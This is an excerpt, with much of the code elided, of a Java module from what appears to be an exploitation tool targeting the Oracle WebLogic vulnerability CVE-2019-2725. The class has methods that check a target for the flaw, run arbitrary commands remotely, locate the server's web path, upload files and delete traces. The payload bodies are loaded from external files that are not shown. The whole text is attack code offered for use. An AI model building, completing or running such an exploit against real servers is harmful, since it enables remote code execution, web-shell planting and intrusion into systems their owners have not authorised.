...
public class CVE_2019_2725_10 implements ExploitInterface {
    ...
    public String checkVul(String url) {
        ...
        String VUL_CMD = Tools.getExp("exp/weblogic/weblogic10_file.txt");
        ...
        HttpTools.post(this.target + VULURL, Tools.getExp("exp/weblogic/weblogic10_deleteFile.txt"), this.headers, "UTF-8");
    ...
    public String exeCmd(String cmd, String encoding) {
        ...
        String VUL_CMD = Tools.getExp("exp/weblogic/weblogic10_cmd.txt");
        ...
        data = Tools.reverse(data);
        this.headers.put("Cookie", data);
        HttpTools.post(this.target + VULURL, Tools.getExp("exp/weblogic/weblogic10_deleteFile.txt"), this.headers, encoding);
    ...
    public String getWebPath() {
        ...
        String VUL_CMD = Tools.getExp("exp/weblogic/weblogic10_path.txt");
    ...
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        ...
        String VUL_File = Tools.getExp("exp/weblogic/weblogic10_file.txt");
